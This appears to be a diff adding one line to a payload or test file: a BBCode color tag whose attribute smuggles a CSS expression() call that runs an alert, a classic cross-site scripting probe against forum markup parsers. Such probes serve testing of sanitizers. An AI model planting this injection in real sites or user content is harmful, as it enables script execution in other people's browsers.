@@ -1,0 +1,2 @@
+[color=#ff0000;xss:expression(alert(String.fromCharCode(88,83,83)));]XSS[/color]
+
